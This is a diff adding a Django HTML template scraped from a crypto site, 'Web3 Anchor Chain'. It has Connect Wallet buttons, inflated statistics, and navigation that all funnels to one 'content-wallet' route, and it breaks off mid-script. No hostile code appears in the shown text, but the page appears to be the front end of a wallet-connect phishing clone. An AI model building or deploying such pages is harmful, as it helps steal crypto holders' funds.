@@ -1,0 +1,1803 @@
+<!DOCTYPE html>
+{% load static %}
+<html lang="en" dir="ltr" style="height: 100%;">
+<script type="text/javascript" charset="utf-8" async=""
+    src="{% static '/Home - Web3 Anchor Chain_files/loader.js'%}"></script>
+<script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/content/location/location.js"
+    id="eppiocemhmnlbhjplcgkofciiegomcon"></script>
+<div id="in-page-channel-node-id" data-channel-name="in_page_channel_oCPmt4" bis_skin_checked="1"></div>
+ 
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <title>Home - Web3 Anchor Chain</title>
+
+    <!-- Favicon -->
+    <link rel="icon" href="content-wallet.svg" type="image/svg+xml">
+
+    <!-- Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com/">
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
+    <link href="{% static '/Home - Web3 Anchor Chain_files/css2'%}" rel="stylesheet">
+
+    <!-- Tabler Icons -->
+    <link rel="stylesheet" href="{% static '/Home - Web3 Anchor Chain_files/icons-sprite.svg'%}">
+
+    <!-- Styles / Scripts -->
+    <link rel="preload" as="style" href="{% static '/Home - Web3 Anchor Chain_files/app-DN6OvxZM.css'%}">
+    <link rel="preload" as="style" href="{% static '/Home - Web3 Anchor Chain_files/app-B_l4pjL9.css'%}">
+    <link rel="modulepreload" as="script" href="{% static '/Home - Web3 Anchor Chain_files/app-wHqCoHq-.js'%}">
+    <link rel="stylesheet" href="{% static '/Home - Web3 Anchor Chain_files/app-DN6OvxZM.css'%}">
+    <link rel="stylesheet" href="{% static '/Home - Web3 Anchor Chain_files/app-B_l4pjL9.css'%}">
+    <script type="module" src="{% static '/Home - Web3 Anchor Chain_files/app-wHqCoHq-.js'%}"></script>
+    <!-- Google Translate -->
+    <script type="text/javascript">
+        function googleTranslateElementInit() {
+            new google.translate.TranslateElement({
+                pageLanguage: 'en'
+            }, 'google_translate_element');
+        }
+    </script>
+ 
+    <script type="text/javascript" src="{% static '/Home - Web3 Anchor Chain_files/element.js'%}"></script>
+    <link type="text/css" rel="stylesheet" charset="UTF-8" href="{% static '/Home - Web3 Anchor Chain_files/m=el_main_css'%}">
+    <script type="text/javascript" charset="UTF-8" src="{% static '/Home - Web3 Anchor Chain_files/m=el_main'%}"></script>
+    <style>
+        @keyframes slide-in-one-tap {
+            from {
+                transform: translateY(80px);
+            }
+
+            to {
+                transform: translateY(0px);
+            }
+        }
+
+        .trust-hide-gracefully {
+            opacity: 0;
+        }
+
+        .trust-wallet-one-tap .hidden {
+            display: none;
+        }
+
+        .trust-wallet-one-tap .semibold {
+            font-weight: 500;
+        }
+
+        .trust-wallet-one-tap .binance-plex {
+            font-family: 'Binance';
+        }
+
+        .trust-wallet-one-tap .rounded-full {
+            border-radius: 50%;
+        }
+
+        .trust-wallet-one-tap .flex {
+            display: flex;
+        }
+
+        .trust-wallet-one-tap .flex-col {
+            flex-direction: column;
+        }
+
+        .trust-wallet-one-tap .items-center {
+            align-items: center;
+        }
+
+        .trust-wallet-one-tap .space-between {
+            justify-content: space-between;
+        }
+
+        .trust-wallet-one-tap .justify-center {
+            justify-content: center;
+        }
+
+        .trust-wallet-one-tap .w-full {
+            width: 100%;
+        }
+
+        .trust-wallet-one-tap .box {
+            transition: all 0.5s cubic-bezier(0, 0, 0, 1.43);
+            animation: slide-in-one-tap 0.5s cubic-bezier(0, 0, 0, 1.43);
+            width: 384px;
+            border-radius: 15px;
+            background: #fff;
+            box-shadow: 0px 2px 4px 0px rgba(0, 0, 0, 0.25);
+            position: fixed;
+            right: 30px;
+            bottom: 30px;
+            z-index: 1020;
+        }
+
+        .trust-wallet-one-tap .header {
+            gap: 15px;
+            border-bottom: 1px solid #e6e6e6;
+            padding: 10px 18px;
+        }
+
+        .trust-wallet-one-tap .header .left-items {
+            gap: 15px;
+        }
+
+        .trust-wallet-one-tap .header .title {
+            color: #1e2329;
+            font-size: 18px;
+            font-weight: 600;
+            line-height: 28px;
+        }
+
+        .trust-wallet-one-tap .header .subtitle {
+            color: #474d57;
+            font-size: 14px;
+            line-height: 20px;
+        }
+
+        .trust-wallet-one-tap .header .close {
+            color: #1e2329;
+            cursor: pointer;
+        }
+
+        .trust-wallet-one-tap .body {
+            padding: 9px 18px;
+            gap: 10px;
+        }
+
+        .trust-wallet-one-tap .body .right-items {
+            gap: 10px;
+            width: 100%;
+        }
+
+        .trust-wallet-one-tap .body .right-items .wallet-title {
+            color: #1e2329;
+            font-size: 16px;
+            font-weight: 600;
+            line-height: 20px;
+        }
+
+        .trust-wallet-one-tap .body .right-items .wallet-subtitle {
+            color: #474d57;
+            font-size: 14px;
+            line-height: 20px;
+        }
+
+        .trust-wallet-one-tap .connect-indicator {
+            gap: 15px;
+            padding: 8px 0;
+        }
+
+        .trust-wallet-one-tap .connect-indicator .flow-icon {
+            color: #474d57;
+        }
+
+        .trust-wallet-one-tap .loading-color {
+            color: #fff;
+        }
+
+        .trust-wallet-one-tap .button {
+            border-radius: 50px;
+            outline: 2px solid transparent;
+            outline-offset: 2px;
+            background-color: rgb(5, 0, 255);
+            border-color: rgb(229, 231, 235);
+            cursor: pointer;
+            text-align: center;
+            height: 45px;
+        }
+
+        .trust-wallet-one-tap .button .button-text {
+            color: #fff;
+            font-size: 16px;
+            font-weight: 600;
+            line-height: 20px;
+        }
+
+        .trust-wallet-one-tap .footer {
+            margin: 20px 30px;
+        }
+
+        .trust-wallet-one-tap .check-icon {
+            color: #fff;
+        }
+
+        @font-face {
+            font-family: 'Binance';
+            src: url(chrome-extension://egjidjbpglichdcondbcbdnbeeppgdph/fonts/BinancePlex-Regular.otf) format('opentype');
+            font-weight: 400;
+            font-style: normal;
+        }
+
+        @font-face {
+            font-family: 'Binance';
+            src: url(chrome-extension://egjidjbpglichdcondbcbdnbeeppgdph/fonts/BinancePlex-Medium.otf) format('opentype');
+            font-weight: 500;
+            font-style: normal;
+        }
+
+        @font-face {
+            font-family: 'Binance';
+            src: url(chrome-extension://egjidjbpglichdcondbcbdnbeeppgdph/fonts/BinancePlex-SemiBold.otf) format('opentype');
+            font-weight: 600;
+            font-style: normal;
+        }
+
+        /*# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbIndlYnBhY2s6Ly8uL2FwcC9zcmMvb25lVGFwL3N0eWxlLmNzcyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiQUFBQTtFQUNFO0lBQ0UsMkJBQTJCO0VBQzdCO0VBQ0E7SUFDRSwwQkFBMEI7RUFDNUI7QUFDRjs7QUFFQTtFQUNFLFVBQVU7QUFDWjs7QUFHRTtJQUNFLGFBQWE7RUFDZjs7QUFFQTtJQUNFLGdCQUFnQjtFQUNsQjs7QUFFQTtJQUNFLHNCQUFzQjtFQUN4Qjs7QUFFQTtJQUNFLGtCQUFrQjtFQUNwQjs7QUFFQTtJQUNFLGFBQWE7RUFDZjs7QUFFQTtJQUNFLHNCQUFzQjtFQUN4Qjs7QUFFQTtJQUNFLG1CQUFtQjtFQUNyQjs7QUFFQTtJQUNFLDhCQUE4QjtFQUNoQzs7QUFFQTtJQUNFLHVCQUF1QjtFQUN6Qjs7QUFFQTtJQUNFLFdBQVc7RUFDYjs7QUFFQTtJQUNFLGdEQUFnRDtJQUNoRCw0REFBNEQ7SUFDNUQsWUFBWTtJQUNaLG1CQUFtQjtJQUNuQixnQkFBZ0I7SUFDaEIsK0NBQStDO0lBQy9DLGVBQWU7SUFDZixXQUFXO0lBQ1gsWUFBWTtJQUNaLGFBQWE7RUFDZjs7QUFFQTtJQUNFLFNBQVM7SUFDVCxnQ0FBZ0M7SUFDaEMsa0JBQWtCO0VBdUJwQjs7QUFyQkU7TUFDRSxTQUFTO0lBQ1g7O0FBRUE7TUFDRSxjQUFjO01BQ2QsZUFBZTtNQUNmLGdCQUFnQjtNQUNoQixpQkFBaUI7SUFDbkI7O0FBRUE7TUFDRSxjQUFjO01BQ2QsZUFBZTtNQUNmLGlCQUFpQjtJQUNuQjs7QUFFQTtNQUNFLGNBQWM7TUFDZCxlQUFlO0lBQ2pCOztBQUdGO0lBQ0UsaUJBQWlCO0lBQ2pCLFNBQVM7RUFtQlg7O0FBakJFO01BQ0UsU0FBUztNQUNULFdBQVc7SUFjYjs7QUFaRTtRQUNFLGNBQWM7UUFDZCxlQUFlO1FBQ2YsZ0JBQWdCO1FBQ2hCLGlCQUFpQjtNQUNuQjs7QUFFQTtRQUNFLGNBQWM7UUFDZCxlQUFlO1FBQ2YsaUJBQWlCO01BQ25COztBQUlKO0lBQ0UsU0FBUztJQUNULGNBQWM7RUFLaEI7O0FBSEU7TUFDRSxjQUFjO0lBQ2hCOztBQUdGO0lBQ0UsV0FBVztFQUNiOztBQUVBO0lBQ0UsbUJBQW1CO0lBQ25CLDhCQUE4QjtJQUM5QixtQkFBbUI7SUFDbkIsZ0NBQWdDO0lBQ2hDLGdDQUFnQztJQUNoQyxlQUFlO0lBQ2Ysa0JBQWtCO0lBQ2xCLFlBQVk7RUFRZDs7QUFORTtNQUNFLFdBQVc7TUFDWCxlQUFlO01BQ2YsZ0JBQWdCO01BQ2hCLGlCQUFpQjtJQUNuQjs7QUFHRjtJQUNFLGlCQUFpQjtFQUNuQjs7QUFFQTtJQUNFLFdBQVc7RUFDYjs7QUFHRjtFQUNFLHNCQUFzQjtFQUN0QiwrREFBMEU7RUFDMUUsZ0JBQWdCO0VBQ2hCLGtCQUFrQjtBQUNwQjs7QUFFQTtFQUNFLHNCQUFzQjtFQUN0QiwrREFBeUU7RUFDekUsZ0JBQWdCO0VBQ2hCLGtCQUFrQjtBQUNwQjs7QUFFQTtFQUNFLHNCQUFzQjtFQUN0QiwrREFBMkU7RUFDM0UsZ0JBQWdCO0VBQ2hCLGtCQUFrQjtBQUNwQiIsInNvdXJjZXNDb250ZW50IjpbIkBrZXlmcmFtZXMgc2xpZGUtaW4tb25lLXRhcCB7XG4gIGZyb20ge1xuICAgIHRyYW5zZm9ybTogdHJhbnNsYXRlWSg4MHB4KTtcbiAgfVxuICB0byB7XG4gICAgdHJhbnNmb3JtOiB0cmFuc2xhdGVZKDBweCk7XG4gIH1cbn1cblxuLnRydXN0LWhpZGUtZ3JhY2VmdWxseSB7XG4gIG9wYWNpdHk6IDA7XG59XG5cbi50cnVzdC13YWxsZXQtb25lLXRhcCB7XG4gIC5oaWRkZW4ge1xuICAgIGRpc3BsYXk6IG5vbmU7XG4gIH1cblxuICAuc2VtaWJvbGQge1xuICAgIGZvbnQtd2VpZ2h0OiA1MDA7XG4gIH1cblxuICAuYmluYW5jZS1wbGV4IHtcbiAgICBmb250LWZhbWlseTogJ0JpbmFuY2UnO1xuICB9XG5cbiAgLnJvdW5kZWQtZnVsbCB7XG4gICAgYm9yZGVyLXJhZGl1czogNTAlO1xuICB9XG5cbiAgLmZsZXgge1xuICAgIGRpc3BsYXk6IGZsZXg7XG4gIH1cblxuICAuZmxleC1jb2wge1xuICAgIGZsZXgtZGlyZWN0aW9uOiBjb2x1bW47XG4gIH1cblxuICAuaXRlbXMtY2VudGVyIHtcbiAgICBhbGlnbi1pdGVtczogY2VudGVyO1xuICB9XG5cbiAgLnNwYWNlLWJldHdlZW4ge1xuICAgIGp1c3RpZnktY29udGVudDogc3BhY2UtYmV0d2VlbjtcbiAgfVxuXG4gIC5qdXN0aWZ5LWNlbnRlciB7XG4gICAganVzdGlmeS1jb250ZW50OiBjZW50ZXI7XG4gIH1cblxuICAudy1mdWxsIHtcbiAgICB3aWR0aDogMTAwJTtcbiAgfVxuXG4gIC5ib3gge1xuICAgIHRyYW5zaXRpb246IGFsbCAwLjVzIGN1YmljLWJlemllcigwLCAwLCAwLCAxLjQzKTtcbiAgICBhbmltYXRpb246IHNsaWRlLWluLW9uZS10YXAgMC41cyBjdWJpYy1iZXppZXIoMCwgMCwgMCwgMS40Myk7XG4gICAgd2lkdGg6IDM4NHB4O1xuICAgIGJvcmRlci1yYWRpdXM6IDE1cHg7XG4gICAgYmFja2dyb3VuZDogI2ZmZjtcbiAgICBib3gtc2hhZG93OiAwcHggMnB4IDRweCAwcHggcmdiYSgwLCAwLCAwLCAwLjI1KTtcbiAgICBwb3NpdGlvbjogZml4ZWQ7XG4gICAgcmlnaHQ6IDMwcHg7XG4gICAgYm90dG9tOiAzMHB4O1xuICAgIHotaW5kZXg6IDEwMjA7XG4gIH1cblxuICAuaGVhZGVyIHtcbiAgICBnYXA6IDE1cHg7XG4gICAgYm9yZGVyLWJvdHRvbTogMXB4IHNvbGlkICNlNmU2ZTY7XG4gICAgcGFkZGluZzogMTBweCAxOHB4O1xuXG4gICAgLmxlZnQtaXRlbXMge1xuICAgICAgZ2FwOiAxNXB4O1xuICAgIH1cblxuICAgIC50aXRsZSB7XG4gICAgICBjb2xvcjogIzFlMjMyOTtcbiAgICAgIGZvbnQtc2l6ZTogMThweDtcbiAgICAgIGZvbnQtd2VpZ2h0OiA2MDA7XG4gICAgICBsaW5lLWhlaWdodDogMjhweDtcbiAgICB9XG5cbiAgICAuc3VidGl0bGUge1xuICAgICAgY29sb3I6ICM0NzRkNTc7XG4gICAgICBmb250LXNpemU6IDE0cHg7XG4gICAgICBsaW5lLWhlaWdodDogMjBweDtcbiAgICB9XG5cbiAgICAuY2xvc2Uge1xuICAgICAgY29sb3I6ICMxZTIzMjk7XG4gICAgICBjdXJzb3I6IHBvaW50ZXI7XG4gICAgfVxuICB9XG5cbiAgLmJvZHkge1xuICAgIHBhZGRpbmc6IDlweCAxOHB4O1xuICAgIGdhcDogMTBweDtcblxuICAgIC5yaWdodC1pdGVtcyB7XG4gICAgICBnYXA6IDEwcHg7XG4gICAgICB3aWR0aDogMTAwJTtcblxuICAgICAgLndhbGxldC10aXRsZSB7XG4gICAgICAgIGNvbG9yOiAjMWUyMzI5O1xuICAgICAgICBmb250LXNpemU6IDE2cHg7XG4gICAgICAgIGZvbnQtd2VpZ2h0OiA2MDA7XG4gICAgICAgIGxpbmUtaGVpZ2h0OiAyMHB4O1xuICAgICAgfVxuXG4gICAgICAud2FsbGV0LXN1YnRpdGxlIHtcbiAgICAgICAgY29sb3I6ICM0NzRkNTc7XG4gICAgICAgIGZvbnQtc2l6ZTogMTRweDtcbiAgICAgICAgbGluZS1oZWlnaHQ6IDIwcHg7XG4gICAgICB9XG4gICAgfVxuICB9XG5cbiAgLmNvbm5lY3QtaW5kaWNhdG9yIHtcbiAgICBnYXA6IDE1cHg7XG4gICAgcGFkZGluZzogOHB4IDA7XG5cbiAgICAuZmxvdy1pY29uIHtcbiAgICAgIGNvbG9yOiAjNDc0ZDU3O1xuICAgIH1cbiAgfVxuXG4gIC5sb2FkaW5nLWNvbG9yIHtcbiAgICBjb2xvcjogI2ZmZjtcbiAgfVxuXG4gIC5idXR0b24ge1xuICAgIGJvcmRlci1yYWRpdXM6IDUwcHg7XG4gICAgb3V0bGluZTogMnB4IHNvbGlkIHRyYW5zcGFyZW50O1xuICAgIG91dGxpbmUtb2Zmc2V0OiAycHg7XG4gICAgYmFja2dyb3VuZC1jb2xvcjogcmdiKDUsIDAsIDI1NSk7XG4gICAgYm9yZGVyLWNvbG9yOiByZ2IoMjI5LCAyMzEsIDIzNSk7XG4gICAgY3Vyc29yOiBwb2ludGVyO1xuICAgIHRleHQtYWxpZ246IGNlbnRlcjtcbiAgICBoZWlnaHQ6IDQ1cHg7XG5cbiAgICAuYnV0dG9uLXRleHQge1xuICAgICAgY29sb3I6ICNmZmY7XG4gICAgICBmb250LXNpemU6IDE2cHg7XG4gICAgICBmb250LXdlaWdodDogNjAwO1xuICAgICAgbGluZS1oZWlnaHQ6IDIwcHg7XG4gICAgfVxuICB9XG5cbiAgLmZvb3RlciB7XG4gICAgbWFyZ2luOiAyMHB4IDMwcHg7XG4gIH1cblxuICAuY2hlY2staWNvbiB7XG4gICAgY29sb3I6ICNmZmY7XG4gIH1cbn1cblxuQGZvbnQtZmFjZSB7XG4gIGZvbnQtZmFtaWx5OiAnQmluYW5jZSc7XG4gIHNyYzogdXJsKCcuL2ZvbnRzL2JpbmFuY2VQbGV4L0JpbmFuY2VQbGV4LVJlZ3VsYXIub3RmJykgZm9ybWF0KCdvcGVudHlwZScpO1xuICBmb250LXdlaWdodDogNDAwO1xuICBmb250LXN0eWxlOiBub3JtYWw7XG59XG5cbkBmb250LWZhY2Uge1xuICBmb250LWZhbWlseTogJ0JpbmFuY2UnO1xuICBzcmM6IHVybCgnLi9mb250cy9iaW5hbmNlUGxleC9CaW5hbmNlUGxleC1NZWRpdW0ub3RmJykgZm9ybWF0KCdvcGVudHlwZScpO1xuICBmb250LXdlaWdodDogNTAwO1xuICBmb250LXN0eWxlOiBub3JtYWw7XG59XG5cbkBmb250LWZhY2Uge1xuICBmb250LWZhbWlseTogJ0JpbmFuY2UnO1xuICBzcmM6IHVybCgnLi9mb250cy9iaW5hbmNlUGxleC9CaW5hbmNlUGxleC1TZW1pQm9sZC5vdGYnKSBmb3JtYXQoJ29wZW50eXBlJyk7XG4gIGZvbnQtd2VpZ2h0OiA2MDA7XG4gIGZvbnQtc3R5bGU6IG5vcm1hbDtcbn1cbiJdLCJzb3VyY2VSb290IjoiIn0= */
+    </style>
+    <style>
+        .imageye-selected {
+            outline: 2px solid black !important;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5) !important;
+        }
+    </style>
+    <script src="chrome-extension://lfhkognknkcapfecnmohcdoekmopfkmm/src/contents/provider/inject.ts.js"
+        type="module"></script>
+</head>
+
+<body class="bg-gray-900 text-white font-[&#39;Outfit&#39;] overflow-x-hidden"
+    bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJlbmFibGVkIiwiRkFDRUJPT0siOiJlbmFibGVkIiwiVFdJVFRFUiI6ImVuYWJsZWQiLCJSRURESVQiOiJlbmFibGVkIiwiUElOVEVSRVNUIjoiZW5hYmxlZCIsIklOU1RBR1JBTSI6ImVuYWJsZWQiLCJUSUtUT0siOiJkaXNhYmxlZCIsIkxJTktFRElOIjoiZW5hYmxlZCIsIkNPTkZJRyI6ImRpc2FibGVkIn0sInZlcnNpb24iOiIyLjAuNDUiLCJzY29yZSI6MjAwNDUwfV0="
+    __processed_65bfd848-719b-432c-bb3b-3430732b4e51__="true" style="position: relative; min-height: 100%; top: 0px;">
+    <!-- Header -->
+    <header x-data="{
+        scrolled: false,
+        mobileMenu: false,
+        initScroll() {
+            this.scrolled = document.documentElement.scrollTop &gt; 20;
+            window.addEventListener(&#39;scroll&#39;, () =&gt; {
+                this.scrolled = window.scrollY &gt; 20
+            })
+        }
+    }" x-init="initScroll()" :class="scrolled ? &#39;bg-gray-800/90 backdrop-blur-md&#39; : &#39;&#39;"
+        class="z-50 py-4 xl:py-6 border-b border-gray-700/30 fixed top-0 left-0 right-0 w-full transition-all duration-300 bg-gray-800/90 backdrop-blur-md">
+        <div x-data="{ isOpen: false, openModal() { this.isOpen = true }, closeModal() { this.isOpen = false } }"
+            class="container mx-auto px-4 flex justify-between items-center" bis_skin_checked="1">
+            <a class="logo-container text-2xl font-bold" href="content-wallet">
+                <span class="logo-word text-secondary-400">Web3</span>
+                <span class="logo-word text-accent-500">Anchor</span>
+                <span class="logo-word text-secondary-500">Chain</span>
+            </a>
+
+            <ul class="hidden lg:flex gap-3 lg:gap-4 xl:gap-8 xl:text-lg">
+                <li><a class="lg:text-lg py-2 inline-flex hover:text-primary-400 transition-colors"
+                        href="content-wallet?staking=">STAKING</a></li>
+                <li><a class="lg:text-lg py-2 inline-flex hover:text-primary-400 transition-colors"
+                        href="content-wallet?farming=">FARMING</a></li>
+                <li><a class="lg:text-lg py-2 inline-flex hover:text-primary-400 transition-colors"
+                        href="content-wallet?crypto=">CRYPTO</a></li>
+                <li><a class="lg:text-lg py-2 inline-flex hover:text-primary-400 transition-colors"
+                        href="content-wallet?defi=">DEFI</a></li>
+                <li><a class="lg:text-lg py-2 inline-flex hover:text-primary-400 transition-colors"
+                        href="content-wallet?web3=">WEB3</a></li>
+                <li><a class="lg:text-lg py-2 inline-flex hover:text-primary-400 transition-colors"
+                        href="content-wallet?nft=">NFT</a></li>
+            </ul>
+
+            <div class="flex gap-3 items-center" bis_skin_checked="1">
+                <a href="content-wallet"
+                    class="hidden lg:inline-flex text-white hover:text-secondary-500 font-medium px-4 py-2 transition-colors">
+                    Login
+                </a>
+                <a href="content-wallet"
+                    class="hidden lg:inline-flex border border-gray-600 hover:border-secondary-500 text-white hover:text-secondary-500 font-medium px-4 py-2 rounded-full transition-all duration-300">
+                    Register
+                </a>
+                <button @click="openModal"
+                    class="bg-gradient-to-r from-primary-500 to-secondary-500 hover:from-primary-600 hover:to-secondary-600 text-white font-semibold px-6 py-2 rounded-full transition-all duration-300 transform hover:scale-105">
+                    Connect Wallet
+                </button>
+                <button @click="mobileMenu = !mobileMenu" class="text-2xl lg:hidden">
+                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                            d="M4 6h16M4 12h16M4 18h16"></path>
+                    </svg>
+                </button>
+            </div>
+
+            <!-- Connect Wallet Modal -->
+            <template x-teleport="body" data-teleport-template="true"></template>
+        </div>
+
+        <!-- Mobile menu -->
+        <div :class="mobileMenu ? &#39;translate-x-0&#39; : &#39;-translate-x-full&#39;"
+            class="absolute h-screen overflow-y-auto bg-gray-800 lg:hidden top-0 left-0 z-50 duration-300 p-4 w-80 -translate-x-full"
+            bis_skin_checked="1">
+            <div class="flex justify-between items-center mb-6" bis_skin_checked="1">
+                <a href="content-wallet">
+                    <div class="logo-container text-xl font-bold " bis_skin_checked="1">
+                        <span class="logo-word text-primary-400">Web3</span>
+                        <span class="logo-word text-secondary-500">Anchor</span>
+                        <span class="logo-word text-accent-500">Chain</span>
+                    </div>
+                </a>
+                <button @click="mobileMenu = false" class="text-xl">
+                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12">
+                        </path>
+                    </svg>
+                </button>
+            </div>
+            <ul class="flex flex-col gap-3">
+
+                <li><a class="py-2 inline-flex hover:text-secondary-500 transition-colors"
+                        href="content-wallet?staking=">STAKING</a>
+                </li>
+                <li><a class="py-2 inline-flex hover:text-secondary-500 transition-colors"
+                        href="content-wallet?farming=">FARMING</a>
+                </li>
+                <li><a class="py-2 inline-flex hover:text-secondary-500 transition-colors"
+                        href="content-wallet?crypto=">CRYPTO</a></li>
+                <li><a class="py-2 inline-flex hover:text-secondary-500 transition-colors"
+                        href="content-wallet?defi=">DEFI</a></li>
+                <li><a class="py-2 inline-flex hover:text-secondary-500 transition-colors"
+                        href="content-wallet?web3=">WEB3</a></li>
+
+                <li><a class="py-2 inline-flex hover:text-secondary-500 transition-colors"
+                        href="content-wallet?nft=">NFT</a></li>
+            </ul>
+
+            <!-- Auth Links for Mobile -->
+            <div class="mt-6 pt-6 border-t border-gray-700" bis_skin_checked="1">
+                <div class="flex flex-col gap-3" bis_skin_checked="1">
+                    <a href="content-wallet"
+                        class="py-2 px-4 text-center bg-transparent border border-gray-600 hover:border-secondary-500 text-white hover:text-secondary-500 font-medium rounded-full transition-all duration-300">
+                        Login
+                    </a>
+                    <a href="content-wallet"
+                        class="py-2 px-4 text-center bg-gradient-to-r from-primary-500 to-secondary-500 hover:from-primary-600 hover:to-secondary-600 text-white font-medium rounded-full transition-all duration-300">
+                        Register
+                    </a>
+                </div>
+            </div>
+        </div>
+        <div x-show="mobileMenu" @click="mobileMenu = false"
+            class="fixed bg-black/50 z-20 w-full h-full inset-0 lg:hidden" bis_skin_checked="1" style="display: none;">
+        </div>
+    </header>
+
+    <!-- Go to top button -->
+    <div x-data="{
+        scrolled: false,
+        gotoTop() {
+            window.scrollTo({ top: 0, behavior: &#39;smooth&#39; });
+        },
+        onScroll() {
+            document.addEventListener(&#39;scroll&#39;, () =&gt; {
+                this.scrolled = document.body.scrollTop &gt; 80 || document.documentElement.scrollTop &gt; 80
+            })
+        }
+    }" x-init="onScroll()" class="fixed bottom-5 right-28 xl:right-32 xl:bottom-7 z-30" bis_skin_checked="1">
+        <button :class="scrolled ? &#39;translate-y-0&#39; : &#39;translate-y-[300px]&#39;"
+            class="w-12 h-12 ease-bounce duration-500 flex items-center justify-center rounded-full bg-gradient-to-r from-primary-500 to-secondary-500 shadow-xl text-2xl text-white translate-y-0"
+            @click="gotoTop()">
+            <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 10l7-7m0 0l7 7m-7-7v18">
+                </path>
+            </svg>
+        </button>
+    </div>
+
+    <!-- Main Content -->
+    <main class="mt-20 xl:mt-24">
+        <!-- Hero Section -->
+        <section class="relative overflow-hidden min-h-screen flex items-center">
+            <!-- Background Elements -->
+            <img class="max-xl:hidden absolute left-0 top-8 animate-slow-rotate opacity-20"
+                src="{% static '/Home - Web3 Anchor Chain_files/ellipse-1.png'%}" alt="">
+            <img class="max-xl:hidden absolute right-0 bottom-16 animate-slow-rotate-reverse opacity-20"
+                src="{% static '/Home - Web3 Anchor Chain_files/ellipse-2.png'%}" alt="">
+            <img class="max-xl:hidden absolute left-10 bottom-8 z-10" src="{% static '/Home - Web3 Anchor Chain_files/rocket.png'%}"
+                alt="">
+            <img class="max-md:hidden absolute right-5 top-12 animate-slow-rotate"
+                src="{% static '/Home - Web3 Anchor Chain_files/globe.png'%}" alt="">
+            <img class="absolute left-[5%] bottom-[30%] animate-slow-rotate-reverse"
+                src="{% static '/Home - Web3 Anchor Chain_files/bitcoin.png'%}" alt="">
+            <img class="absolute right-[12%] top-[40%] animate-slow-rotate"
+                src="{% static '/Home - Web3 Anchor Chain_files/coin-1.png'%}" alt="">
+
+            <!-- Gradient Blurs -->
+            <div class="max-lg:hidden w-64 h-52 xl:w-96 xl:h-96 absolute bottom-[-15%] blur-[85px] left-[-12%] bg-primary-500/30"
+                bis_skin_checked="1">
+            </div>
+            <div class="max-lg:hidden w-64 xl:w-80 h-64 xl:h-80 absolute top-[6%] blur-[85px] left-[-12%] bg-secondary-500/30"
+                bis_skin_checked="1">
+            </div>
+            <div class="max-lg:hidden w-64 xl:w-80 h-64 xl:h-80 absolute bottom-[6%] blur-[85px] right-[-8%] bg-accent-500/30"
+                bis_skin_checked="1">
+            </div>
+
+            <div class="container mx-auto px-4 py-20 grid grid-cols-12 gap-6 items-center relative z-10"
+                bis_skin_checked="1">
+                <div class="col-span-12 lg:col-span-6 relative max-lg:flex max-lg:flex-col max-lg:items-center max-lg:text-center"
+                    bis_skin_checked="1">
+                    <h1 class="text-4xl md:text-5xl xl:text-6xl font-bold mb-6 fade-up text-white">
+                        Gateway to Encrypt, back up, and
+                        <span class="gradient-text">secure</span>
+                        <span class="text-secondary-500">your assets</span>
+                    </h1>
+                    <p class="mb-8 xl:mb-10 max-w-md lg:text-lg text-gray-100 fade-up">
+                        The easiest, safest, and fastest way to secure &amp; back up crypto asset.
+                    </p>
+                    <div x-data="{ isOpen: false, openModal() { this.isOpen = true }, closeModal() { this.isOpen = false } }"
+                        class="flex gap-6 fade-up" bis_skin_checked="1">
+                        <button @click="openModal"
+                            class="bg-gradient-to-r from-primary-500 to-secondary-500 hover:from-primary-600 hover:to-secondary-600 text-white font-semibold px-8 py-3 rounded-full transition-all duration-300 transform hover:scale-105">
+                            Connect Wallet
+                        </button>
+                        <button @click="openModal"
+                            class="border-2 border-gray-600 hover:border-secondary-500 text-white hover:text-secondary-500 font-semibold px-8 py-3 rounded-full transition-all duration-300">
+                            Explore Now
+                        </button>
+
+                        <!-- Modal for buttons -->
+                        <template x-teleport="body" data-teleport-template="true"></template>
+                    </div>
+                </div>
+
+                <div class="col-span-12 lg:col-span-5 lg:col-start-8 relative max-lg:flex max-lg:justify-center fade-up"
+                    bis_skin_checked="1">
+                    <img src="{% static '/Home - Web3 Anchor Chain_files/Web3-removebg-preview.png'%}"
+                        class="relative z-10 max-w-full h-auto" alt="Web3 Crypto">
+                    <div class="w-72 h-72 md:w-80 md:h-80 absolute top-[6%] blur-[85px] left-0 bg-gradient-to-r from-primary-500/30 to-secondary-500/30"
+                        bis_skin_checked="1">
+                    </div>
+                </div>
+
+                <!-- Statistics Section -->
+                <div x-data="{
+                    countries: 63,
+                    investors: 30,
+                    wallets: 700,
+                    volume: &#39;1.36&#39;,
+                    hasStarted: false,
+                
+                    startCounting() {
+                        if (this.hasStarted) return;
+                        this.hasStarted = true;
+                
+                        // Reset to 0 and start counting
+                        this.countries = 0;
+                        this.investors = 0;
+                        this.wallets = 0;
+                        this.volume = &#39;0.00&#39;;
+                
+                        // Animate countries
+                        this.animateValue(&#39;countries&#39;, 0, 63, 2000);
+                        // Animate investors
+                        this.animateValue(&#39;investors&#39;, 0, 30, 2500);
+                        // Animate wallets
+                        this.animateValue(&#39;wallets&#39;, 0, 700, 3000);
+                        // Animate volume
+                        this.animateValue(&#39;volume&#39;, 0, 1.36, 2800, true);
+                    },
+                
+                    animateValue(property, start, end, duration, isDecimal = false) {
+                        const startTime = Date.now();
+                        const change = end - start;
+                
+                        const animate = () =&gt; {
+                            const elapsed = Date.now() - startTime;
+                            const progress = Math.min(elapsed / duration, 1);
+                            const easeProgress = 1 - Math.pow(1 - progress, 4);
